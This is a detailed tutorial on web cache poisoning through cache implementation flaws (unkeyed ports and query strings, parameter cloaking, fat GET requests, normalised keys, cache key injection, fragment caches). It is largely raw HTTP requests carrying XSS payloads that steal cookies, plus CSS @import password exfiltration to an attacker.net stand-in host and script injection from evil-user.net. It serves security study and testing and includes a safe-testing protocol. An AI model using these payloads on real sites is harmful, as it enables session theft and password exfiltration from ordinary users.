# Exploiting Cache Implementation Flaws

Cache implementation flaws are a qualitatively different class of vulnerability from cache design flaws — they do not arise from headers being unkeyed by choice but from the gap between what the cache *thinks* it is keying and what the back-end *actually* receives. Every transformation, normalisation, and parsing shortcut the cache applies to the request before storing it as a cache key creates a potential discrepancy, and every discrepancy is a potential injection surface. These techniques were first systematically documented by James Kettle in the 2020 "Web Cache Entanglement" research, which demonstrated real-world exploitation including poisoning every page of a national newspaper and compromising a DoD internal administration panel — accessible only via internal network — by poisoning its fragment cache from the public internet. 

**Fundamental principle: Cache implementation flaws exploit the gap between the transformed, normalised value written to the cache key and the raw, untransformed value forwarded to the application — anything the cache strips, normalises, or misparses is a hidden injection surface that the application may still process while the cache maps the request to a clean, shared cache entry.**

***

## Phase 1: Cache Probing Methodology

Before exploiting anything, you need to build a mental model of exactly how the target cache behaves. The steps below apply to all implementation flaw research. 

### Step 1: Identify a Cache Oracle

```http
# A cache oracle is any endpoint that:
# 1. Is cacheable (Cache-Control: public or no explicit no-store)
# 2. Indicates whether you received a cached or fresh response
# 3. Ideally reflects the URL and at least one query parameter in its output
#
# Forms of cache feedback:
# ─────────────────────────────────────────────────────────────────────────────
# Explicit headers:
#   X-Cache: hit / miss
#   CF-Cache-Status: HIT / MISS / EXPIRED
#   Age: 174          ← response has been in cache 174 seconds → confirms caching
#   Via: 1.1 varnish  ← identifies Varnish as the cache layer
#
# Behavioural feedback:
#   Response time:  ~300–800ms (back-end)  vs  ~5–30ms (cache)
#   Dynamic content changes:  if output changes per-request → not cached
#
# ── EXAMPLE: Oracle discovery ─────────────────────────────────────────────────

# Request 1 — should get a fresh back-end response:
GET /?param=UNIQUEVALUE1 HTTP/1.1
Host: vulnerable-website.com

# Response:
# HTTP/1.1 200 OK
# X-Cache: miss
# Age: 0
# Cache-Status: miss
# <title>Home Page</title>
# <p>…UNIQUEVALUE1…</p>   ← parameter reflected → useful oracle ✓

# Request 2 — same request again immediately:
GET /?param=UNIQUEVALUE1 HTTP/1.1
Host: vulnerable-website.com

# Response:
# HTTP/1.1 200 OK
# X-Cache: hit           ← now a cache hit → confirms caching
# Age: 2
# <p>…UNIQUEVALUE1…</p>  ← same value served from cache

# Akamai — direct cache key inspection:
GET /?param=1 HTTP/1.1
Host: target-on-akamai.com
Pragma: akamai-x-get-cache-key

# Response header reveals exact key:
# X-Cache-Key: target-on-akamai.com/?param=1
# → Compare what you sent vs what appears here → reveals all transformations
```

### Step 2: Probe Key Handling

```http
# ── PROBING: Is the port excluded from the cache key? ────────────────────────

# Step 1: Send with arbitrary port — must get a fresh miss with port reflected:
GET / HTTP/1.1
Host: vulnerable-website.com:1337

# Response (fresh from back-end):
# HTTP/1.1 302 Moved Permanently
# Location: https://vulnerable-website.com:1337/en
# Cache-Status: miss
# ↑ Port is reflected in Location → back-end uses the full Host value

# Step 2: Send WITHOUT the port:
GET / HTTP/1.1
Host: vulnerable-website.com

# Response:
# HTTP/1.1 302 Moved Permanently
# Location: https://vulnerable-website.com:1337/en   ← STILL shows :1337 !!
# Cache-Status: hit
# ↑ Cache HIT despite different Host → port was stripped from cache key
# ↑ But the full original Host (with port) was forwarded to back-end and cached

# INTERPRETATION:
#  Cache key used:    vulnerable-website.com    (port stripped)
#  Back-end received: vulnerable-website.com:1337 (port preserved)
#  → Cache matches requests with and without the port to the same entry
#  → We can inject a payload in the port position and it maps to all normal users

# ── PROBING: Is the query string excluded? ────────────────────────────────────

# Use a keyed header as cache buster (standard ?cb= won't work if query is unkeyed):
GET / HTTP/1.1
Host: vulnerable-website.com
Origin: https://cachebuster-UNIQUE1.vulnerable-website.com  ← keyed

# Response: X-Cache: miss

GET / HTTP/1.1
Host: vulnerable-website.com
Origin: https://cachebuster-UNIQUE1.vulnerable-website.com

# Response: X-Cache: hit → confirmed caching with Origin buster

# Now test with different query string values, same Origin buster:
GET /?foo=1 HTTP/1.1
Host: vulnerable-website.com
Origin: https://cachebuster-UNIQUE1.vulnerable-website.com

# Response: X-Cache: hit  (despite new query param ?foo=1)
# → Query string ignored in cache key → UNKEYED QUERY STRING ✓

# ── ALTERNATIVE PATH-BASED BUSTERS (when query is unkeyed) ───────────────────

# These paths all hit the same back-end route but produce distinct cache keys:
# Apache:   GET //
# Nginx:    GET /%2F
# PHP:      GET /index.php/xyz
# .NET:     GET /(A(xyz)/
#
# Use one of these for your cache buster when query string is fully unkeyed
```

***

## Exploitation Type 1: Unkeyed Port

```http
# ── SCENARIO: Port excluded from cache key, Host used in redirect URL ─────────

# Confirmed: port is excluded from cache key (see probing above)
# Confirmed: Host header (including port) used to generate Location redirect

# ── ATTACK A: Denial of Service ───────────────────────────────────────────────

# Poison with a non-existent port → all users redirected to a dead port
GET / HTTP/1.1
Host: vulnerable-website.com:9999

# Response (fresh from back-end):
# HTTP/1.1 302 Moved Permanently
# Location: https://vulnerable-website.com:9999/en
# Cache-Status: miss

# Re-send until Cache-Status: hit
# Cached 302 now redirects all home page visitors to :9999 → nothing serves there
# Effect: home page is effectively unavailable for all users until TTL expires

# ── ATTACK B: XSS via non-numeric port ─────────────────────────────────────────

# If the application accepts non-numeric port values and reflects without validation:
GET / HTTP/1.1
Host: vulnerable-website.com:"><script>alert(document.cookie)</script>

# Response:
# HTTP/1.1 302 Moved Permanently
# Location: https://vulnerable-website.com:"><script>alert(document.cookie)</script>/en
#
# Cache key (port stripped): vulnerable-website.com/
# Cached response: XSS in Location header

# Note: Only exploitable if the browser follows the redirect and the XSS fires
# in the redirect target context. Works best when:
# 1. Application renders the Location value in an HTML error page
# 2. Browser processes the redirect and interprets HTML in the destination
```

***

## Exploitation Type 2: Unkeyed Query String

```http
# ── CONFIRMED: Entire query string excluded from cache key ────────────────────

# Goal: inject a reflected XSS payload via a query parameter.
# Without this flaw: victim would need to visit a crafted URL with the XSS payload.
# With this flaw: any user visiting the clean, normal URL receives the XSS.

# Step 1: Identify reflection (using keyed Origin as cache buster):
GET /?q=CANARY HTTP/1.1
Host: vulnerable-website.com
Origin: https://cachebuster-TEST1.vulnerable-website.com

# Response (miss):
# <title>Search results for: CANARY</title>
# ↑ Query parameter reflected unencoded in response ✓

# Step 2: Confirm the reflection is not sanitised (XSS candidate):
GET /?q=<script>alert(1)</script> HTTP/1.1
Host: vulnerable-website.com
Origin: https://cachebuster-TEST1.vulnerable-website.com

# Response:
# <title>Search results for: <script>alert(1)</script></title>
# ↑ Raw XSS payload reflected → sanitisation absent → XSS present ✓
# ↑ Cache-Status: miss → came from back-end

# Step 3: Remove the cache buster — poison the real cache key:
GET /?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: vulnerable-website.com
# (no Origin cache buster)

# Re-send until:
# Cache-Status: hit   OR   X-Cache: hit

# Step 4: Victim visits the clean URL — no XSS in their request:
GET / HTTP/1.1
Host: vulnerable-website.com

# Response:
# X-Cache: hit
# <title>Search results for: <script>alert(document.cookie)</script></title>
# → XSS fires in victim's browser ✓
# → Attack requires zero victim interaction with a crafted URL

# ── WHY THIS IS MORE DANGEROUS THAN STANDARD REFLECTED XSS ───────────────────

# Standard Reflected XSS:
#   → Attacker sends victim:  https://target.com/?q=<script>...</script>
#   → Victim must click the crafted link (phishing required)
#   → Browser may encode special characters in the URL bar
#   → WAFs can detect and block the specific crafted URL

# Cache poisoning via unkeyed query string:
#   → Attacker poisons:  https://target.com/
#   → Victim visits:     https://target.com/   (perfectly normal URL)
#   → No crafted URL, no phishing required
#   → WAF sees a normal GET / request from victim → undetectable ✓
```

***

## Exploitation Type 3: Unkeyed Query Parameters

```http
# ── SCENARIO: UTM parameters excluded from cache key but reflected ─────────────

# Unlike unkeyed query strings (where ALL params are excluded), some caches
# exclude only specific analytics/tracking parameters while keeping others.
# The trick: some pages handle the ENTIRE URL in a way that makes any parameter useful.

# Test which parameters are excluded:
GET /?utm_source=CANARY1 HTTP/1.1       → check if utm_source is reflected + unkeyed
GET /?utm_content=CANARY2 HTTP/1.1      → check utm_content
GET /?fbclid=CANARY3 HTTP/1.1           → Facebook click ID
GET /?gclid=CANARY4 HTTP/1.1            → Google click ID

# Confirmation method:
# Send with parameter → X-Cache: miss → note response content
# Send again without parameter → X-Cache: hit AND original content still present
# → Parameter is excluded from cache key but still processed by back-end ✓

# ── CANONICAL LINK INJECTION EXAMPLE ─────────────────────────────────────────

# Many pages include the full URL in a canonical link tag for SEO:
# <link rel="canonical" href="https://vulnerable.com/?utm_content=INJECTEDVALUE"/>
#                                                                 ↑ reflected value

# Test for XSS via utm_content:
GET /?utm_content='><script>alert(document.cookie)</script> HTTP/1.1
Host: vulnerable-website.com
# cache buster in Origin header initially

# Response:
# <link rel="canonical" href="https://vulnerable.com/?utm_content='><script>alert(document.cookie)</script>"/>
# ↑ breaks out of href attribute → XSS ✓

# Poison the live cache (remove buster):
GET /?utm_content='><script>alert(document.cookie)</script> HTTP/1.1
Host: vulnerable-website.com

# → Repeat until X-Cache: hit
# → All users visiting vulnerable.com/ receive the XSS payload ✓
```

***

## Exploitation Type 4: Cache Parameter Cloaking

Parameter cloaking exploits parsing discrepancies between how the cache identifies query parameters and how the back-end application does — hiding a malicious parameter inside one the cache treats as a single unkeyed value. 

### Variant A: Double Question Mark (Cache sees two params; back-end sees one)

```
# ── PARSING DISCREPANCY: second ? treated as new parameter by cache ───────────

# Vulnerable URL structure:
GET /?example=123?excluded_param=bad-stuff-here HTTP/1.1

# Cache parsing algorithm (treats every ? as a delimiter):
#   Sees two parameters:
#     param 1: example = 123
#     param 2: excluded_param = bad-stuff-here   ← excluded, stripped from cache key
#   Cache key: /?example=123   ← CLEAN key that matches normal user requests

# Back-end parsing algorithm (treats only first ? as delimiter):
#   Sees ONE parameter:
#     param 1: example = 123?excluded_param=bad-stuff-here
#   Back-end receives:  example = "123?excluded_param=bad-stuff-here"
#                                  ↑ our payload is part of example's value

# IMPLICATION: If example is passed into a gadget (reflected in JS, JSONP callback, etc.),
# the payload is injected while the cache key remains clean.
#
# Example with JSONP callback:
GET /search?q=test?callback=<script>alert(1)</script> HTTP/1.1

# Cache sees:
#   q = test
#   callback = <script>alert(1)</script>   ← excluded → stripped from key
#   Cache key: /search?q=test   ← maps to all users searching "test"

# Back-end sees:
#   q = test?callback=<script>alert(1)</script>
#   → If q is reflected in a JSONP context: callback(<script>alert(1)</script>)({...});
#   → XSS fires ✓
```

### Variant B: Semicolon Delimiter (Ruby on Rails)

```http
# ── RUBY ON RAILS PARSING: semicolon (;) is a valid parameter delimiter ───────

# Rails treats both & and ; as parameter delimiters.
# Most CDN caches treat ONLY & as a delimiter.

# Poisoning request:
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here HTTP/1.1

# ── HOW THE CACHE PARSES THIS ─────────────────────────────────────────────────
# Cache uses & only as delimiter → sees TWO parameters:
#   keyed_param    = abc
#   excluded_param = 123;keyed_param=bad-stuff-here   ← entire second chunk is ONE value

# Cache excludes excluded_param → cache key contains only:
#   keyed_param = abc
#   Cache key: /?keyed_param=abc   ← MATCHES all normal users requesting /?keyed_param=abc

# ── HOW RAILS PARSES THIS ─────────────────────────────────────────────────────
# Rails uses both & and ; as delimiters → sees THREE parameters:
#   keyed_param    = abc
#   excluded_param = 123
#   keyed_param    = bad-stuff-here   ← DUPLICATE key!

# Rails rule: when duplicate parameters exist → LAST VALUE wins
# Rails gives application: keyed_param = "bad-stuff-here"   ← injected payload ✓

# Cache key = clean (keyed_param=abc)
# Back-end receives = poisoned (keyed_param=bad-stuff-here)
# → Poisoned response cached under the clean key → all users affected ✓

# ── PRACTICAL EXAMPLE: JSONP callback override ────────────────────────────────

# Endpoint: GET /jsonp?callback=innocentFunction
# Response: innocentFunction({"user":"Carlos","email":"carlos@..."})

# Attacker request (cache buster first):
GET /jsonp?callback=innocentFunction&utm_content=123;callback=alert(1) HTTP/1.1
Host: vulnerable-website.com
Origin: https://cb-TEST.vulnerable-website.com

# Cache sees:
#   callback      = innocentFunction   ← keyed
#   utm_content   = 123;callback=alert(1)   ← EXCLUDED (unkeyed parameter)
#   Cache key:    /jsonp?callback=innocentFunction

# Rails sees:
#   callback    = innocentFunction
#   utm_content = 123
#   callback    = alert(1)             ← duplicate → Rails uses THIS
# Rails gives callback = alert(1)

# Response (from back-end):
# alert(1)({"user":"Carlos","email":"carlos@..."})
# ↑ alert(1) called as a function → XSS ✓

# Response (cached under):
# /jsonp?callback=innocentFunction
# → All users who call /jsonp?callback=innocentFunction receive alert(1) response ✓

# Poison live cache (remove Origin buster):
GET /jsonp?callback=innocentFunction&utm_content=123;callback=alert(document.cookie) HTTP/1.1
Host: vulnerable-website.com
# Repeat until X-Cache: hit ✓
```

***

## Exploitation Type 5: Fat GET Requests

```http
# ── SCENARIO A: Cache keys only on request line; back-end reads GET body ──────

# Cache key = GET method + path + query string (from request line)
# Back-end = reads body of GET requests (non-standard but some frameworks accept it)
# Result: body is unkeyed, but back-end uses body value if parameter appears in both

# Attack:
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

param=<script>alert(1)</script>

# Cache key: /?param=innocent   ← maps to normal user requests ✓
# Back-end:  param = <script>alert(1)</script>  (body takes precedence over URL)
# Cached response: contains XSS payload

# Victim visits /?param=innocent → cache serves poisoned response → XSS fires ✓

# ── SCENARIO B: X-HTTP-Method-Override as a bridge ────────────────────────────

# When: back-end won't read GET body unless method is overridden
# Condition: X-HTTP-Method-Override header is unkeyed (cache ignores it)

GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST       ← if unkeyed, cache key is still GET /?param=innocent
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

param=<script>alert(1)</script>

# Cache key: GET /?param=innocent  ← unchanged, because X-HTTP-Method-Override unkeyed
# Back-end:  treats request as POST → reads body → param = <script>...</script>
# Cached response: XSS ✓

# ── VERIFYING WHETHER A SERVER ACCEPTS FAT GET REQUESTS ───────────────────────

# Test 1: Send GET with body, distinct param value
GET /?testparam=from_url HTTP/1.1
Content-Type: application/x-www-form-urlencoded

testparam=from_body

# If response reflects "from_body" → back-end reads body on GET ✓
# If response reflects "from_url"  → back-end ignores body on GET

# Frameworks/servers known to accept fat GET in some configs:
# ✓ Apache + mod_rewrite (in certain configurations)
# ✓ Some Django configurations
# ✓ AWS Elastic Load Balancer (passes body through regardless of method)
# ✓ Some Node.js / Express setups where body-parser is applied to all methods
```

***

## Exploitation Type 6: Dynamic Content in Resource Imports

```http
# ── SCENARIO: CSS resource reflects query parameters in @import ───────────────

# Some CSS or JS files include dynamic @import or url() statements
# that reflect query parameters from the request.

# Test request:
GET /style.css?excluded_param=CANARY HTTP/1.1

# Response:
# HTTP/1.1 200 OK
# Content-Type: text/css
# @import url('/site/home/index.part1.css?excluded_param=CANARY');
#                                                      ↑ reflected ✓

# The excluded_param IS excluded from cache key → unkeyed → injectable

# ── ATTACK A: CSS @import exfiltration ───────────────────────────────────────

# Craft payload that closes the existing @import and injects a new one:
GET /style.css?excluded_param=123);@import+url('https://attacker.net/exfil.css') HTTP/1.1

# Response:
# @import url('/site/home/index.part1.css?excluded_param=123');
# @import url('https://attacker.net/exfil.css')
#                                    ↑ attacker's CSS loaded by the browser ✓

# Attacker's exfil.css:
# [Input[type=password][value^=a] { background: url('https://attacker.net/?p=a'); }
# [Input[type=password][value^=b] { background: url('https://attacker.net/?p=b'); }
# ... (for each possible first character)
# → CSS-based password exfiltration from any page importing style.css ✓

# ── ATTACK B: Server error reflects param into text/html CSS context ──────────

# When: server returns an error page when CSS file is fetched with certain params
# The error is text/html but some browsers treat it as CSS if no DOCTYPE present

GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

# Response:
# HTTP/1.1 200 OK
# Content-Type: text/html   ← error response
#
# This request was blocked due to...alert(1)
# {}*{color:red;}

# If the importing page lacks a DOCTYPE:
# Browser scours document for CSS → finds alert(1){}*{color:red;}
# → Executes as CSS (rendering), and alert(1) treated as a function call if
#   the page also runs loose JavaScript parsing → JS/CSS context confusion ✓

# Poison the CSS cache entry:
# Remove cache buster → re-send until X-Cache: hit
# All pages importing /style.css will load the attacker's CSS ✓
```

***

## Exploitation Type 7: Normalised Cache Keys

```http
# ── PROBLEM: Reflected XSS exists but browsers URL-encode the payload ─────────

# Normal reflected XSS attack:
# Attacker crafts: https://target.com/example?param="><test>
# Browser sends:   GET /example?param=%22%3e%3ctest%3e HTTP/1.1  ← URL-encoded
# Server reflects: %22%3e%3ctest%3e  ← harmless URL-encoded string, not executed

# This XSS is "unexploitable" in the normal sense.

# ── THE NORMALISATION EXPLOIT ─────────────────────────────────────────────────

# Some caches normalise (URL-decode) the cache key before looking it up.
# If the cache normalises %22 → "  and %3e → > etc., then:
#
#   Request A (attacker via Burp Repeater — raw unencoded characters):
#     GET /example?param="><test> HTTP/1.1
#     Cache key after normalisation: /example?param="><test>
#
#   Request B (victim via browser — URL-encoded):
#     GET /example?param=%22%3e%3ctest%3e HTTP/1.1
#     Cache key after normalisation: /example?param="><test>   ← SAME KEY ✓

# Both requests produce the same cache key after normalisation.
# The attacker poisons the cache with the raw unencoded XSS payload (via Burp).
# The victim's browser requests the URL-encoded version.
# Cache normalises the victim's request key → matches the poisoned entry.
# Cache serves the poisoned response → XSS fires in victim's browser.

# ── STEP-BY-STEP EXPLOIT ─────────────────────────────────────────────────────

# Step 1: Confirm reflection exists (using Burp Repeater — raw bytes)
GET /example?param="><script>alert(document.cookie)</script> HTTP/1.1
Host: target.com

# Response:
# <p>Your search: "><script>alert(document.cookie)</script></p>
# X-Cache: miss   ← back-end response, XSS present unencoded ✓

# Step 2: Verify normalisation — compare cache keys:
# Send URL-encoded version:
GET /example?param=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e HTTP/1.1
Host: target.com

# Response: X-Cache: hit   ← HIT despite the encoded characters being different
#           Still contains unencoded XSS payload from previous request
# → Cache normalised the key → matched the raw version → NORMALISATION CONFIRMED ✓

# Step 3: Poison at scale — send raw payload via Burp Repeater:
GET /example?param="><script>alert(document.cookie)</script> HTTP/1.1
Host: target.com

# Repeat until X-Cache: hit

# Step 4: Generate the victim URL (normal browser usage, encoded by browser):
# https://target.com/example?param=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e
#
# OR: share the clean URL and the cache will serve the poisoned entry:
# https://target.com/example?param="><test>
#
# In both cases, the normalised cache key matches → poisoned response served ✓
# "Unexploitable" reflected XSS is now fully exploitable ✓
```

***

## Exploitation Type 8: Cache Key Injection

```http
# ── SCENARIO: Cache builds key by concatenating components with unescaped delimiter ──

# Cache key format: {path}?{query}__{Header-Name}={Header-Value}__
# Delimiter:        __ (double underscore — NOT escaped in key construction)

# Step 1: Request with a keyed header → observe the cache key:
GET /path?param=123 HTTP/1.1
Host: target.com
Origin: test

# Response:
# X-Cache-Key: /path?param=123__Origin=test__     ← key revealed
#              ↑ delimiter is __ before and after Origin value

# Step 2: Inject the delimiter into the Origin header value to manipulate the key:
GET /path?param=123 HTTP/1.1
Host: target.com
Origin: '-alert(1)-'__

# Response:
# X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
#                                        ↑ injected XSS in keyed header
# Back-end reflects Origin value in a <script> block:
# <script>var config = {origin: "'-alert(1)-'"};</script>  ← payload in JS context

# Step 3: Construct the URL that generates the SAME cache key WITHOUT the Origin header:
# Required cache key: /path?param=123__Origin='-alert(1)-'__
# Inject the delimiter and injected value via the query string instead:

GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1
Host: target.com
# (no Origin header)

# Cache key generated: /path?param=123__Origin='-alert(1)-'__
# → MATCHES the poisoned entry from Step 2 ✓
# → Poisoned response served → '-alert(1)-' executes in JS context ✓

# Step 4: The attack URL for victims:
# https://target.com/path?param=123__Origin='-alert(1)-'__
#
# This URL LOOKS like a weird query string to the victim.
# But the cache treats it as a key collision with the injected entry.
# No special request headers required from the victim ✓

# ── WHY THIS MATTERS ──────────────────────────────────────────────────────────
# Origin is a KEYED header → normally considered immune to cache poisoning.
# The cache would create a separate entry per Origin value.
# BUT: the unescaped delimiter lets us forge a cache key that includes the
# Origin payload via the query string → the keyed header becomes an attack vector.
# A vulnerability "in a keyed component" is no longer automatically safe.
```

***

## Exploitation Type 9: Internal Cache Poisoning

Internal / application-level fragment caches are the most severe implementation flaw. They cache *fragments* (template partials, shared page sections) rather than complete responses, and have no concept of a cache key per user request — meaning a single poisoning request can corrupt a shared fragment served to every user on every page. 

```http
# ── IDENTIFYING AN INTERNAL (FRAGMENT) CACHE ─────────────────────────────────

# Signal 1: Input reflected across multiple distinct pages
# Inject a value in a header:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: CANARY12345

# Normal external cache behaviour: only / is affected
# Internal fragment cache behaviour: CANARY12345 appears in responses on OTHER pages
# (because those pages share the cached fragment that reflects X-Forwarded-Host)

# Signal 2: Response reflects a MIX of values from different requests
# Request 1: X-Forwarded-Host: VALUE_A → response contains VALUE_A in JS import
# Request 2: X-Forwarded-Host: VALUE_B → response STILL contains VALUE_A in JS import
#            but a different section of the page reflects VALUE_B
# → Fragment cached from request 1; full page assembled from multiple cache entries

# Signal 3: External cache is MISS but internal fragment is already poisoned
# Remove the header entirely:
GET / HTTP/1.1
Host: target.com
# (no X-Forwarded-Host)

# External cache: MISS (no full-page cache entry exists)
# Internal fragment: still reflects attacker's previous value
# → Fragment cache survived the external cache bypass ✓

# ── HOW FRAGMENT CACHES WORK ─────────────────────────────────────────────────
#
#  Page assembly from fragments:
#  ─────────────────────────────────────────────────────────────────
#  GET /              → Assembles page from:
#                         + Fragment: <head> (cached independently)
#                         + Fragment: navigation bar (cached independently)
#                         + Fresh: page body (not cached)
#                         + Fragment: footer (cached independently)
#
#  If attacker poisons the <head> fragment (which imports analytics.js using
#  X-Forwarded-Host), EVERY page on the site now imports evil-user.net/analytics.js
#  because they ALL use the shared <head> fragment.
#  ─────────────────────────────────────────────────────────────────

# ── ATTACK EXECUTION ──────────────────────────────────────────────────────────

# Step 1: Identify that X-Forwarded-Host is unkeyed by internal cache:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil-user.net

# Response: <script src="https://evil-user.net/resources/js/analytics.js"></script>
# X-Cache: miss (external cache missed, but...)

GET / HTTP/1.1
Host: target.com
# (no X-Forwarded-Host)

# Response still contains: <script src="https://evil-user.net/resources/js/analytics.js"></script>
# X-Cache: miss (external still missed)
# → Internal fragment cache is poisoned ✓

# Step 2: Confirm fragment affects multiple pages:
GET /blog HTTP/1.1
Host: target.com

# Response: <script src="https://evil-user.net/resources/js/analytics.js"></script>
# ↑ /blog also contains the poisoned fragment → site-wide impact confirmed ✓

# Step 3: Host malicious JS on attacker's server — done.
# No further poisoning requests needed.
# Every page on the site, for every user, loads evil-user.net/analytics.js ✓

# ── ⚠ SAFETY WARNING: SAFE TESTING PROTOCOL ──────────────────────────────────

# Internal caches have NO cache key → traditional cache busters are USELESS
# A single test request can poison the cache for ALL REAL USERS immediately.
#
# MANDATORY safety measures:
# 1. Only inject domains you control — never evil-user.net from a public exploit
# 2. Host a harmless response on your domain (HTTP 204 or empty JS file)
# 3. Perform internal cache testing in a staging environment where possible
# 4. If testing on live: immediately send a clean request after each test
#    to attempt to overwrite the fragment with the legitimate value
# 5. Monitor your own server for incoming requests to confirm poisoning,
#    then immediately remediate
#
# Example safe payload host:
# https://your-collaborator.burpcollaborator.net/resources/js/analytics.js
# → Returns empty JS → no actual damage to users
# → Your Collaborator panel shows DNS/HTTP callbacks → confirms code execution ✓
```
